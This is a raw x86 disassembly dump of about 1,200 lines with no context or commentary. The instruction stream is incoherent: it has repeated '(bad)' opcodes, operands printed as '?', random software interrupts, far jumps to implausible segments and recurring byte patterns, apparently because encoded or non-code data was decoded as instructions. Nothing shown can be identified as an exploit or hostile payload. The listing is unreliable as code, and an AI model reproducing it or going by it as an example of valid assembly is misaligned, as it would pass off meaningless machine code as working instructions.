  422c9c:	rcl    DWORD PTR [edx-0x32021933],cl
  422ca2:	leave  
  422ca3:	xor    esi,DWORD PTR [esi+0x34]
  422ca6:	pop    esi
  422ca7:	jbe    0x422c4e
  422ca9:	jnp    0x422c35
  422cab:	int    0xf8
  422cad:	xor    edx,esi
  422caf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cb0:	int    0x96
  422cb2:	cmp    al,0x45
  422cb4:	inc    ecx
  422cb5:	inc    ebx
  422cb6:	add    esi,DWORD PTR [edi-0x79]
  422cb9:	jle    0x422c91
  422cbb:	clc    
  422cbc:	or     ah,dh
  422cbe:	std    
  422cbf:	das    
  422cc0:	pop    ecx
  422cc1:	adc    DWORD PTR [ebx-0x1a],eax
  422cc4:	cmp    al,0x2f
  422cc6:	or     esp,DWORD PTR [edx-0x2]
  422cc9:	add    BYTE PTR [eax],al
  422ccb:	mov    ebp,0x80808040
  422cd0:	xor    ebp,DWORD PTR [ebp-0x31]
  422cd3:	les    esi,FWORD PTR [esp+eiz*2]
  422cd6:	int    0x96
  422cd8:	sub    al,0xcd
  422cda:	(bad)  
  422cdb:	stc    
  422cdc:	xor    edx,esi
  422cde:	sbb    al,0xa
  422ce0:	inc    edx
  422ce1:	int    0x96
  422ce3:	inc    esp
  422ce4:	int    0xe6
  422ce6:	std    
  422ce7:	xor    esp,esi
  422ce9:	xor    al,0xa
  422ceb:	pusha  
  422cec:	retf   
  422ced:	arpl   WORD PTR [eax-0x7fdb2d56],bp
  422cf3:	test   al,0x9c
  422cf5:	xor    ebp,DWORD PTR [ebp+0x6c]
  422cf8:	in     al,dx
  422cf9:	popf   
  422cfa:	adc    bh,ah
  422cfc:	add    BYTE PTR [eax-0x7e7d7e80],0xc5
  422d03:	shl    ebp,cl
  422d05:	mov    BYTE PTR [eax+0x43f9d6cd],bl
  422d0b:	(bad)  
  422d0c:	and    al,0x77
  422d0e:	mov    ch,0xcd
  422d10:	jbe    0x422cbf
  422d12:	shr    DWORD PTR [ebp+0x760a4588],cl
  422d18:	lods   eax,DWORD PTR ds:[esi]
  422d19:	or     dl,dh
  422d1b:	stc    
  422d1c:	test   al,0xc5
  422d1e:	int    0x8d
  422d20:	jne    0x422d51
  422d22:	pop    ecx
  422d23:	ins    DWORD PTR es:[edi],dx
  422d24:	shl    edx,cl
  422d26:	test   BYTE PTR [edi-0x2c78428a],al
  422d2c:	in     al,dx
  422d2d:	xchg   BYTE PTR [edi],ch
  422d2f:	pop    ecx
  422d30:	ins    DWORD PTR es:[edi],dx
  422d31:	xchg   DWORD PTR [esi+0x75],esi
  422d34:	int    0xc6
  422d36:	jge    0x422d07
  422d38:	les    esi,FWORD PTR [esi-0x80]
  422d3b:	xor    ebp,DWORD PTR [ebp-0x31]
  422d3e:	les    esi,FWORD PTR [esi-0x80]
  422d41:	adc    bh,ah
  422d43:	add    BYTE PTR [eax+0x24778180],0xcd
  422d4a:	mov    WORD PTR [esp+ebx*2],?
  422d4d:	shl    DWORD PTR [esp+esi*1-0x73bc77d4],cl
  422d54:	xor    al,0xa4
  422d56:	ja     0x422d7d
  422d58:	retf   0x31
  422d5b:	je     0x422d91
  422d5d:	pop    esp
  422d5e:	shl    ebp,cl
  422d60:	mov    BYTE PTR [ecx],cl
  422d62:	xchg   esp,eax
  422d63:	xor    al,0x2c
  422d65:	int    0xc
  422d67:	das    
  422d68:	mov    ebx,0xebd38096
  422d6d:	push   ebx
  422d6e:	das    
  422d6f:	rcl    DWORD PTR [ebx],1
  422d71:	pop    esi
  422d72:	mov    WORD PTR [esp+ebp*1],?
  422d75:	ja     0x422d91
  422d77:	int    0xdb
  422d79:	pop    edi
  422d7a:	or     BYTE PTR [eax+0x13338080],0xd3
  422d81:	jmp    0x422d08
  422d83:	mov    eax,0x87808d81
  422d88:	ins    DWORD PTR es:[edi],dx
  422d89:	iret   
  422d8a:	les    esi,FWORD PTR [esp+ebp*2]
  422d8d:	(bad)
  422d90:	test   DWORD PTR [esi],edi
  422d92:	mov    WORD PTR [esp+ebp*1],?
  422d95:	xor    ebx,ebx
  422d97:	mov    eax,0x8780963e
  422d9c:	ins    DWORD PTR es:[edi],dx
  422d9d:	add    al,0x6d
  422d9f:	or     edi,0xc56c34c4
  422da5:	cwde   
  422da6:	int    0xf0
  422da8:	mov    ebp,0xfcd9
  422dad:	int    0xd9
  422daf:	int    0xf
  422db1:	jns    0x422d39
  422db3:	mov    bh,0xbd
  422db5:	sub    esp,edi
  422db7:	add    BYTE PTR [eax],al
  422db9:	cwde   
  422dba:	int    0xf0
  422dbc:	jns    0x422e36
  422dbe:	test   DWORD PTR [ebx+0xfc6bbd],esp
  422dc4:	add    BYTE PTR [eax-0x58798787],bl
  422dca:	mov    ebp,0xfc38
  422dcf:	jns    0x422e49
  422dd1:	xchg   edx,eax
  422dd2:	cmp    eax,0xeceb99cd
  422dd7:	add    eax,DWORD PTR [eax]
  422dd9:	add    BYTE PTR [esi-0x12ed1233],dl
  422ddf:	inc    esp
  422de0:	add    DWORD PTR [eax-0x6893680],0x35862149
  422dea:	leave  
  422deb:	jbe    0x422da2
  422ded:	inc    ecx
  422dee:	and    DWORD PTR [esi-0x778932cb],eax
  422df4:	or     dh,BYTE PTR [esi-0x78]
  422df7:	int    0x76
  422df9:	stc    
  422dfa:	int    0x96
  422dfc:	stc    
  422dfd:	pop    ebx
  422dfe:	cwde   
  422dff:	call   0xd3e3:0x3b9effc0
  422e06:	jmp    0x3586:0x21d1bf28
  422e0d:	cmp    eax,ebp
  422e0f:	sar    DWORD PTR [ebp+0xad25392],cl
  422e15:	jbe    0x422e8c
  422e17:	int    0x76
  422e19:	stc    
  422e1a:	int    0x96
  422e1c:	stc    
  422e1d:	cmp    eax,ebp
  422e1f:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e25:	jmp    0xfd76:0xad25328
  422e2c:	int    0x76
  422e2e:	stc    
  422e2f:	int    0x96
  422e31:	stc    
  422e32:	cmp    eax,ebp
  422e34:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e3a:	jmp    0xd076:0xad25328
  422e41:	int    0x76
  422e43:	stc    
  422e44:	int    0x96
  422e46:	stc    
  422e47:	cmp    eax,ebp
  422e49:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e4f:	jmp    0xbd76:0xad25328
  422e56:	leave  
  422e57:	jbe    0x422e86
  422e59:	dec    ecx
  422e5a:	and    DWORD PTR [ebp+esi*1+0x496576c9],eax
  422e61:	mov    al,ds:0x76c93586
  422e66:	and    eax,0x35862169
  422e6b:	sar    BYTE PTR [esp+ebx*4],0xa
  422e6f:	jbe    0x422e41
  422e71:	or     dh,BYTE PTR [esi-0x30]
  422e74:	sar    BYTE PTR [esp+ebx*4+0xad0760a],0x76
  422e7c:	ror    cl,1
  422e7e:	jbe    0x422e50
  422e80:	jo     0x422e02
  422e82:	add    BYTE PTR [eax+0x78d076c9],0x80
  422e89:	add    BYTE PTR [eax-0x32068933],0x96
  422e90:	stc    
  422e91:	cmp    eax,ebp
  422e93:	cmp    esp,ebx
  422e95:	sar    DWORD PTR [ebp+0x28ead392],cl
  422e9b:	push   ebx
  422e9c:	ror    BYTE PTR [edx],cl
  422e9e:	jbe    0x422e70
  422ea0:	int    0x76
  422ea2:	stc    
  422ea3:	int    0x96
  422ea5:	stc    
  422ea6:	cmp    eax,ebp
  422ea8:	cmp    esp,ebx
  422eaa:	sar    DWORD PTR [ebp+0x28ead392],cl
  422eb0:	push   ebx
  422eb1:	ror    BYTE PTR [edx],cl
  422eb3:	jbe    0x422e85
  422eb5:	leave  
  422eb6:	jbe    0x422e4d
  422eb8:	arpl   WORD PTR [edx+0x76c98080],dx
  422ebe:	lods   eax,DWORD PTR ds:[esi]
  422ebf:	pop    esi
  422ec0:	add    BYTE PTR [eax+0xd76c980],0xe6
  422ec7:	add    BYTE PTR [eax-0xa983080],0xff
  422ece:	add    BYTE PTR [eax],al
  422ed0:	iret   
  422ed1:	push   edi
  422ed2:	xchg   ebp,eax
  422ed3:	inc    DWORD PTR [eax]
  422ed5:	add    BYTE PTR [ebp+0xff13],bh
  422edb:	add    BYTE PTR [ebp+0xf3d60d],cl
  422ee1:	lea    ebp,[ebp-0x72ff562a]
  422ee7:	xchg   ebp,eax
  422ee8:	(bad)  
  422ee9:	fcmove st,st(1)
  422eeb:	jbe    0x422e9a
  422eed:	dec    esi
  422eee:	ins    BYTE PTR es:[edi],dx
  422eef:	add    BYTE PTR [eax-0x32068933],0x8d
  422ef6:	stc    
  422ef7:	cmp    eax,ebp
  422ef9:	sar    DWORD PTR [ebp-0x57003f6e],cl
  422eff:	cmp    ecx,DWORD PTR [edi]
  422f01:	shl    edx,cl
  422f03:	sub    BYTE PTR [ebx-0x2d],dl
  422f06:	or     dh,BYTE PTR [esi+0x6d]
  422f09:	int    0x76
  422f0b:	stc    
  422f0c:	int    0x8d
  422f0e:	stc    
  422f0f:	add    al,0xb6
  422f11:	cmc    
  422f12:	cmp    BYTE PTR [ebx],0xc5
  422f15:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  422f1b:	repnz sub BYTE PTR [ebx-0x2d],dl
  422f1f:	or     dh,BYTE PTR [esi-0x6b]
  422f22:	mov    ah,0xb1
  422f24:	sbb    al,0x80
  422f26:	add    BYTE PTR [eax-0x320a89f6],0x6c
  422f2d:	push   eax
  422f2e:	or     dh,BYTE PTR [esi-0x13]
  422f31:	int    0x6c
  422f33:	dec    esp
  422f34:	or     dh,BYTE PTR [esi+0x11]
  422f37:	int    0x76
  422f39:	mov    bh,cl
  422f3b:	(bad)  
  422f3c:	cmc    
  422f3d:	or     cl,BYTE PTR [ecx]
  422f3f:	rol    BYTE PTR [ecx+0x76cd8080],1
  422f45:	mov    bh,cl
  422f47:	(bad)  
  422f48:	in     eax,dx
  422f49:	or     cl,BYTE PTR [ecx]
  422f4b:	push   ebp
  422f4c:	add    DWORD PTR [eax-0x77893280],0xcf88d600
  422f56:	lea    edx,[ecx]
  422f58:	or     cl,BYTE PTR [ecx]
  422f5a:	pop    ebp
  422f5b:	add    DWORD PTR [eax+0x3eccbd80],0x8dcd8080
  422f65:	stc    
  422f66:	int    0x96
  422f68:	stc    
  422f69:	cmp    ecx,DWORD PTR [ebx+edi*1]
  422f6c:	cdq    
  422f6d:	shr    ebx,cl
  422f6f:	xchg   edx,eax
  422f70:	shr    edx,cl
  422f72:	sub    BYTE PTR [ebx+0x13],dl
  422f75:	inc    ebx
  422f76:	jge    0x422fa7
  422f78:	add    eax,0x808087ca
  422f7d:	int    0x76
  422f7f:	mov    ch,cl
  422f81:	add    DWORD PTR ds:0xcd808081,esi
  422f87:	mov    ch,cl
  422f89:	jbe    0x422f13
  422f8b:	int    0x1
  422f8d:	xor    eax,0xcd808081
  422f92:	add    BYTE PTR [edi-0x72329b92],0x88
  422f99:	int    0xa
  422f9b:	adc    DWORD PTR [ecx+0x17cf8080],eax
  422fa1:	adc    al,0x0
  422fa3:	add    BYTE PTR [eax],al
  422fa5:	(bad)  
  422fa6:	int    0x96
  422fa8:	mov    ch,cl
  422faa:	mov    ds:0x80808125,al
  422faf:	int    0x22
  422fb1:	xchg   DWORD PTR [eax-0x7f7f7ff7],esi
  422fb7:	rol    BYTE PTR [eax+eax*1-0x7f7f3330],0x80
  422fbf:	bound  eax,QWORD PTR [eax]
  422fc1:	jno    0x422fe7
  422fc3:	cmp    ebp,DWORD PTR [ebp-0x37]
  422fc6:	push   es
  422fc7:	push   esp
  422fc8:	add    BYTE PTR [eax],al
  422fca:	add    BYTE PTR [esi],cl
  422fcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fcd:	aad    0x49
  422fcf:	leave  
  422fd0:	push   es
  422fd1:	pop    esp
  422fd2:	add    BYTE PTR [eax],al
  422fd4:	add    BYTE PTR [edi+0x35],dl
  422fd7:	adc    ebp,DWORD PTR [ebx+0x6406c9]
  422fdd:	add    BYTE PTR [eax],al
  422fdf:	mov    ds:0x79d735c1,eax
  422fe4:	push   es
  422fe5:	ins    BYTE PTR es:[edi],dx
  422fe6:	add    BYTE PTR [eax],al
  422fe8:	add    BYTE PTR [eax],bl
  422fea:	iret   
  422feb:	outs   dx,BYTE PTR ds:[si]
  422fed:	add    BYTE PTR [eax],al
  422fef:	add    BYTE PTR [edi+0x3b41afb8],ch
  422ff5:	ins    DWORD PTR es:[edi],dx
  422ff6:	leave  
  422ff7:	push   es
  422ff8:	sub    al,0x0
  422ffa:	add    BYTE PTR [eax],al
  422ffc:	push   cs
  422ffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ffe:	aad    0x49
  423000:	leave  
  423001:	push   es
  423002:	xor    al,0x0
  423004:	add    BYTE PTR [eax],al
  423006:	push   edi
  423007:	xor    eax,0x6c9ab13
  42300c:	cmp    al,0x0
  42300e:	add    BYTE PTR [eax],al
  423010:	mov    ds:0x79c335c1,eax
  423015:	push   es
  423016:	inc    esp
  423017:	add    BYTE PTR [eax],al
  423019:	add    BYTE PTR [eax],bl
  42301b:	iret   
  42301c:	addr16 inc esi
  42301e:	add    BYTE PTR [eax],al
  423020:	add    BYTE PTR [edi-0x32be5048],ch
  423026:	jbe    0x422fb0
  423028:	int    0x1
  42302a:	adc    DWORD PTR [ecx-0x19327f80],eax
  423030:	mov    BYTE PTR [ebp*2+0x35760a30],al
  423037:	int    0x76
  423039:	mov    ch,cl
  42303b:	add    DWORD PTR [ebp-0x7f],edi
  42303e:	add    BYTE PTR [eax+0x410176c9],0xa7
  423045:	mov    dl,0x35
  423047:	leave  
  423048:	jbe    0x42304f
  42304a:	mov    bh,0x3f
  42304c:	cmp    DWORD PTR [edi-0x48],eax
  42304f:	leave  
  423050:	jbe    0x42305b
  423052:	xlat   BYTE PTR ds:[ebx]
  423053:	sbb    cl,cl
  423055:	push   es
  423056:	les    eax,FWORD PTR [eax]
  423058:	add    BYTE PTR [eax],al
  42305a:	push   cs
  42305b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42305c:	aad    0x49
  42305e:	leave  
  42305f:	push   es
  423060:	nop
  423061:	add    BYTE PTR [eax],al
  423063:	add    BYTE PTR [edi+0x35],dl
  423066:	xlat   BYTE PTR ds:[ebx]
  423067:	inc    ecx
  423068:	leave  
  423069:	push   es
  42306a:	aam    0x0
  42306c:	add    BYTE PTR [eax],al
  42306e:	cmp    DWORD PTR [ecx+0x57],ecx
  423071:	jge    0x42303c
  423073:	push   es
  423074:	fadd   QWORD PTR [eax]
  423076:	add    BYTE PTR [eax],al
  423078:	mov    cl,0x3f
  42307a:	shl    DWORD PTR ds:0xe406c9,0x0
  423081:	add    BYTE PTR [edi-0x49],al
  423084:	xlat   BYTE PTR ds:[ebx]
  423085:	sbb    cl,cl
  423087:	push   es
  423088:	pushf  
  423089:	add    BYTE PTR [eax],al
  42308b:	add    BYTE PTR [esi],cl
  42308d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42308e:	aad    0x49
  423090:	leave  
  423091:	push   es
  423092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423093:	add    BYTE PTR [eax],al
  423095:	add    BYTE PTR [edi+0x35],dl
  423098:	xlat   BYTE PTR ds:[ebx]
  423099:	inc    ecx
  42309a:	leave  
  42309b:	push   es
  42309c:	lods   al,BYTE PTR ds:[esi]
  42309d:	add    BYTE PTR [eax],al
  42309f:	add    BYTE PTR [ecx],bh
  4230a1:	dec    ecx
  4230a2:	push   edi
  4230a3:	jge    0x42306e
  4230a5:	push   es
  4230a6:	mov    ah,0x0
  4230a8:	add    BYTE PTR [eax],al
  4230aa:	mov    cl,0x3f
  4230ac:	shl    DWORD PTR ds:0xbc06c9,0x0
  4230b3:	add    BYTE PTR [edi-0x49],al
  4230b6:	ret    
  4230b7:	sbb    BYTE PTR [ebp-0x7f7fc39d],bh
  4230bd:	jo     0x42308c
  4230bf:	jbe    0x4230f6
  4230c1:	add    BYTE PTR [eax],dh
  4230c3:	int    0x76
  4230c5:	stc    
  4230c6:	int    0x8d
  4230c8:	stc    
  4230c9:	cmp    eax,ebp
  4230cb:	cmp    ecx,DWORD PTR [edi]
  4230cd:	shl    edx,cl
  4230cf:	sub    bl,dl
  4230d1:	mov    ebp,0xcdd35392
  4230d6:	lea    ebp,[ebp+0x52fd343]
  4230dc:	test   BYTE PTR [ecx+0x76cd8080],0xb5
  4230e3:	int    0x8d
  4230e5:	mov    ch,0x3b
  4230e7:	lds    edi,FWORD PTR [ebx]
  4230e9:	psrlq  mm6,mm2
  4230ec:	sub    bl,dl
  4230ee:	mov    ebp,0xcdd35392
  4230f3:	lea    ebp,[ebp+0x76cd7d33]
  4230f9:	ins    DWORD PTR es:[edi],dx
  4230fa:	inc    ebx
  4230fb:	shr    DWORD PTR [edi],cl
  4230fd:	or     ch,dl
  4230ff:	add    DWORD PTR [eax+0x3d76c980],0x80808080
  423109:	int    0x76
  42310b:	mov    ch,cl
  42310d:	rcl    BYTE PTR [ecx],1
  42310f:	add    DWORD PTR [eax-0x77193280],0xcd8876cd
  423119:	add    DWORD PTR [ebp-0x7f],esi
  42311c:	add    BYTE PTR [eax-0x7fc50943],0x80
  423123:	jo     0x423125
  423125:	cwde   
  423126:	xor    ch,cl
  423128:	lea    ecx,[eax-0x7ebaf533]
  42312e:	add    BYTE PTR [eax+0x76cd810a],0x88
  423135:	int    0x5d
  423137:	adc    DWORD PTR [ecx-0x29327f80],eax
  42313d:	mov    BYTE PTR [ebx],bh
  42313f:	ins    DWORD PTR es:[edi],dx
  423140:	iret   
  423141:	pop    ss
  423142:	pushf  
  423143:	add    BYTE PTR [eax],al
  423145:	add    BYTE PTR [ebp-0x7f7fc36e],bh
  42314b:	jo     0x42311a
  42314d:	jbe    0x4230d7
  42314f:	int    0x1
  423151:	inc    ebp
  423152:	add    DWORD PTR [eax+0x500080],0x760a889a
  42315c:	adc    eax,0xcd8876cd
  423161:	pop    ebp
  423162:	adc    DWORD PTR [ecx-0x29327f80],eax
  423168:	mov    BYTE PTR [ebx],bh
  42316a:	ins    DWORD PTR es:[edi],dx
  42316b:	iret   
  42316c:	pop    ss
  42316d:	les    eax,FWORD PTR [eax]
  42316f:	add    BYTE PTR [eax],al
  423171:	mov    ebp,0x80803ad9
  423176:	jo     0x423145
  423178:	jbe    0x423102
  42317a:	int    0x1
  42317c:	inc    ebp
  42317d:	add    DWORD PTR [eax+0x500080],0x76cd889a
  423187:	mov    ch,cl
  423189:	pop    ebp
  42318a:	adc    DWORD PTR [ecx-0x29327f80],eax
  423190:	mov    BYTE PTR [ebx],bh
  423192:	ins    DWORD PTR es:[edi],dx
  423193:	iret   
  423194:	pop    ss
  423195:	push   esp
  423196:	add    BYTE PTR [eax],al
  423198:	add    BYTE PTR [ebp-0x7f7fc52f],bh
  42319e:	jo     0x42316d
  4231a0:	jbe    0x42312a
  4231a2:	int    0x1
  4231a4:	inc    ebp
  4231a5:	add    DWORD PTR [eax+0x500080],0xb604889a
  4231af:	pop    ebp
  4231b0:	or     BYTE PTR [edx],0x76
  4231b3:	xor    eax,0xc05d76cd
  4231b8:	push   ds
  4231b9:	cmp    ebx,edx
  4231bb:	sahf   
  4231bc:	clc    
  4231bd:	add    al,BYTE PTR [ecx]
  4231bf:	shr    BYTE PTR [esi+0x2f],cl
  4231c2:	pop    ecx
  4231c3:	shl    BYTE PTR [eax+0x0],cl
  4231c6:	xchg   esi,eax
  4231c7:	xor    eax,0x43d66d06
  4231cc:	int    0x76
  4231ce:	pop    ebp
  4231cf:	add    al,0xad
  4231d1:	mov    eax,DWORD PTR [ebp*2-0x69ff8faf]
  4231d8:	adc    eax,0x40d46d06
  4231dd:	int    0x76
  4231df:	mov    ch,cl
  4231e1:	pop    ebp
  4231e2:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231e8:	mov    BYTE PTR [ebx],bh
  4231ea:	ins    DWORD PTR es:[edi],dx
  4231eb:	iret   
  4231ec:	xchg   esi,eax
  4231ed:	add    DWORD PTR [ebp-0x7f7fc560],edi
  4231f3:	jo     0x4231c2
  4231f5:	jbe    0x42317f
  4231f7:	int    0x1
  4231f9:	cmp    eax,0x808081
  4231fe:	push   eax
  4231ff:	add    BYTE PTR [edx+0xd760a88],bl
  423205:	in     al,dx
  423206:	test   BYTE PTR [esi+esi*4],al
  423209:	or     eax,0x5d760080
  42320e:	add    al,0xe6
  423210:	pop    ebp
  423211:	sub    al,0x82
  423213:	sub    eax,0xcdb576cd
  423218:	lea    esi,[ebp-0x3f772933]
  42321e:	jmp    FWORD PTR [edx-0xfc43ac5]
  423224:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42322a:	push   ebx
  42322b:	ror    edi,cl
  42322d:	pop    ss
  42322e:	cmc    
  42322f:	inc    DWORD PTR [eax]
  423231:	add    BYTE PTR [ebp-0x7f7fc5e8],bh
  423237:	jo     0x423206
  423239:	jbe    0x423234
  42323b:	int    0x8d
  42323d:	stc    
  42323e:	int    0xd6
  423240:	mov    BYTE PTR [ebx],bh
  423242:	lds    edi,FWORD PTR [ebx]
  423244:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42324b:	push   ebx
  42324c:	ror    edi,cl
  42324e:	pop    ss
  42324f:	xchg   ebp,eax
  423250:	inc    DWORD PTR [eax]
  423252:	add    BYTE PTR [ebp-0x7f7fc70a],bh
  423258:	jo     0x42325a
  42325a:	xchg   esi,eax
  42325b:	or     eax,0xcdf98dcd
  423260:	xchg   esi,eax
  423261:	stc    
  423262:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423265:	(bad)  
  423267:	jmp    0x4231fb
  423269:	shr    edx,cl
  42326b:	sub    BYTE PTR [ebx+0x13],dl
  42326e:	inc    ebx
  42326f:	jge    0x423247
  423271:	mov    ecx,ecx
  423273:	jbe    0x4232b2
  423275:	add    DWORD PTR [eax+0x76cd8080],0xb58dcdb5
  42327f:	cmp    eax,ebp
  423281:	sar    DWORD PTR [ebp-0x2c0fc46e],cl
  423287:	repnz sub BYTE PTR [ebx-0x2d],dl
  42328b:	xchg   DWORD PTR [esi+0x6d],esi
  42328e:	or     dh,BYTE PTR [esi+0x6d]
  423291:	int    0x76
  423293:	cmp    eax,0x1cd46d06
  423298:	int    0x76
  42329a:	mov    ch,0xcd
  42329c:	lea    esi,[ebp-0xfc43ac5]
  4232a2:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4232a8:	push   ebx
  4232a9:	rol    DWORD PTR [edi+0x760a9576],cl
  4232af:	xchg   ebp,eax
  4232b0:	int    0x76
  4232b2:	mov    ch,0xcd
  4232b4:	lea    esi,[ebp-0xfc43ac5]
  4232ba:	shl    edx,cl
  4232bc:	sub    bl,dl
  4232be:	mov    ebp,0xcdd35392
  4232c3:	lea    ebp,[ebp+0x76cd7d33]
  4232c9:	ins    DWORD PTR es:[edi],dx
  4232ca:	inc    ebx
  4232cb:	shr    DWORD PTR [edi],cl
  4232cd:	pop    es
  4232ce:	push   eax
  4232cf:	inc    DWORD PTR [eax]
  4232d1:	add    al,al
  4232d3:	jmp    FWORD PTR [eax-0x326a8933]
  4232d9:	lea    ebp,[ebp+0x43]
  4232dc:	jge    0x4232b4
  4232de:	xor    DWORD PTR [eax],eax
  4232e0:	(bad)  
  4232e1:	mov    bh,cl
  4232e3:	jbe    0x4232e2
  4232e5:	jo     0x4232a4
  4232e7:	stc    
  4232e8:	jl     0x42326a
  4232ea:	or     BYTE PTR [edx],0x76
  4232ed:	jne    0x4232db
  4232ef:	sbb    cl,ch
  4232f1:	jbe    0x423368
  4232f3:	int    0x8d
  4232f5:	mov    ch,0xcd
  4232f7:	xchg   esi,eax
  4232f8:	mov    ch,0x3b
  4232fa:	or     al,0x3b
  4232fc:	cdq    
  4232fd:	shr    ebx,cl
  4232ff:	xchg   edx,eax
  423300:	shr    edx,cl
  423302:	sub    BYTE PTR [ebx+0x13],dl
  423305:	push   ecx
  423306:	mov    ch,cl
  423308:	jbe    0x423303
  42330a:	int    0x8d
  42330c:	stc    
  42330d:	cmp    eax,ebp
  42330f:	cmp    ecx,DWORD PTR [edi]
  423311:	shl    edx,cl
  423313:	sub    bl,dl
  423315:	mov    ebp,0xcdd35392
  42331a:	lea    esi,[ebp+0x43]
  42331d:	shr    DWORD PTR [edi],cl
  42331f:	add    eax,0x80805300
  423324:	int    0x76
  423326:	stc    
  423327:	int    0x8d
  423329:	stc    
  42332a:	cmp    eax,ebp
  42332c:	cmp    ecx,DWORD PTR [edi]
  42332e:	shl    edx,cl
  423330:	sub    bl,dl
  423332:	mov    ebp,0xcdd35392
  423337:	(bad)  
  423338:	std    
  423339:	inc    ebx
  42333a:	shr    DWORD PTR [edi],cl
  42333c:	add    eax,0x808053ea
  423341:	int    0x76
  423343:	stc    
  423344:	int    0x8d
  423346:	stc    
  423347:	cmp    eax,ebp
  423349:	cmp    ecx,DWORD PTR [edi]
  42334b:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423351:	push   ebx
  423352:	shr    esp,cl
  423354:	adc    al,0xcd
  423356:	lea    esi,[ebp+0x3bb596cd]
  42335c:	or     al,0x3b
  42335e:	cdq    
  42335f:	shr    ebx,cl
  423361:	xchg   edx,eax
  423362:	shr    edx,cl
  423364:	sub    BYTE PTR [ebx+0x13],dl
  423367:	xchg   ebx,edx
  423369:	int    0x8d
  42336b:	std    
  42336c:	inc    ebx
  42336d:	rol    DWORD PTR [edx-0x2893219],cl
  423373:	or     dh,BYTE PTR [esi-0x53]
  423376:	int    0x76
  423378:	jne    0x423384
  42337a:	jbe    0x42334c
  42337c:	ret    
  42337d:	dec    ecx
  42337e:	and    DWORD PTR [esi+0x45e60a35],eax
  423384:	leave  
  423385:	jbe    0x423324
  423387:	inc    ecx
  423388:	and    DWORD PTR [esi+0x4576cd35],eax
  42338e:	int    0x8d
  423390:	inc    ebp
  423391:	cmp    eax,ebp
  423393:	cmp    ecx,DWORD PTR [edi]
  423395:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42339b:	push   ebx
  42339c:	ror    DWORD PTR [edx],cl
  42339e:	jbe    0x4233f5
  4233a0:	int    0x76
  4233a2:	inc    ebp
  4233a3:	int    0x8d
  4233a5:	inc    ebp
  4233a6:	cmp    eax,ebp
  4233a8:	cmp    ecx,DWORD PTR [edi]
  4233aa:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233b0:	push   ebx
  4233b1:	ror    DWORD PTR [edx],cl
  4233b3:	jbe    0x42334a
  4233b5:	leave  
  4233b6:	jbe    0x4233f5
  4233b8:	dec    eax
  4233b9:	and    DWORD PTR [esi+0x1d76c935],eax
  4233bf:	ret    0x8621
  4233c2:	xor    eax,0xcd4576cd
  4233c7:	lea    eax,[ebp+0x3b]
  4233ca:	lds    edi,FWORD PTR [ebx]
  4233cc:	psrlq  mm6,mm2
  4233cf:	sub    bl,dl
  4233d1:	mov    ebp,0xcdd35392
  4233d6:	lea    ebp,[ebp+0x52f7d43]
  4233dc:	push   ss
  4233dd:	xchg   DWORD PTR [eax-0x6d241480],eax
  4233e3:	add    BYTE PTR [eax-0x32c27233],0x76
  4233ea:	cmp    eax,0x3b5596cd
  4233ef:	jns    0x42342c
  4233f1:	or     al,0xd3
  4233f3:	lods   eax,DWORD PTR ds:[esi]
  4233f4:	sub    bl,dl
  4233f6:	jmp    0x42338a
  4233f8:	push   ebx
  4233f9:	jge    0x4233c8
  4233fb:	jbe    0x4233aa
  4233fd:	xor    edx,edx
  4233ff:	cmp    ebx,edx
  423401:	clc    
  423402:	add    cl,BYTE PTR [edx]
  423404:	jbe    0x42339b
  423406:	int    0x76
  423408:	sbb    eax,0x3b1d8dcd
  42340d:	lds    edi,FWORD PTR [ebx]
  42340f:	psrlq  mm6,mm2
  423412:	sub    bl,dl
  423414:	mov    ebp,0xcdd35392
  423419:	lea    edx,[ebp+0x16d87d43]
  42341f:	int    0x76
  423421:	sbb    eax,0x3b1d8dcd
  423426:	lds    edi,FWORD PTR [ebx]
  423428:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  42342f:	push   ebx
  423430:	ror    DWORD PTR [edx],cl
  423432:	jbe    0x4233c9
  423434:	int    0x76
  423436:	cmp    eax,0x3b3d8dcd
  42343b:	lds    edi,FWORD PTR [ebx]
  42343d:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  423444:	push   ebx
  423445:	ror    ebp,cl
  423447:	lea    edx,[ebp+0xad3d12f]
  42344d:	jbe    0x4233e4
  42344f:	int    0x76
  423451:	inc    ebp
  423452:	int    0x8d
  423454:	inc    ebp
  423455:	cmp    eax,ebp
  423457:	cmp    ecx,DWORD PTR [edi]
  423459:	shl    edx,cl
  42345b:	sub    bl,dl
  42345d:	mov    ebp,0xcdd35392
  423462:	lea    edx,[ebp+0x52f7d43]
  423468:	pusha  
  423469:	xchg   edx,eax
  42346a:	add    BYTE PTR [eax+0xa9576cd],0x76
  423471:	or     eax,0x875576cd
  423476:	jbe    0x423448
  423478:	or     ah,dh
  42347a:	xchg   ebp,eax
  42347b:	or     dh,BYTE PTR [esi+0x6d]
  42347e:	pop    ebp
  42347f:	inc    ecx
  423480:	and    DWORD PTR [esi+0x5d760a35],eax
  423486:	leave  
  423487:	jbe    0x42349e
  423489:	cmp    DWORD PTR [ecx],esp
  42348b:	xchg   BYTE PTR ds:0xb23576c9,dh
  423491:	and    DWORD PTR [esi-0xe89f5cb],eax
  423497:	int    0x76
  423499:	xchg   ebp,eax
  42349a:	int    0x8d
  42349c:	xchg   ebp,eax
  42349d:	cmp    eax,ebp
  42349f:	cmp    ecx,DWORD PTR [edi]
  4234a1:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4234a7:	push   ebx
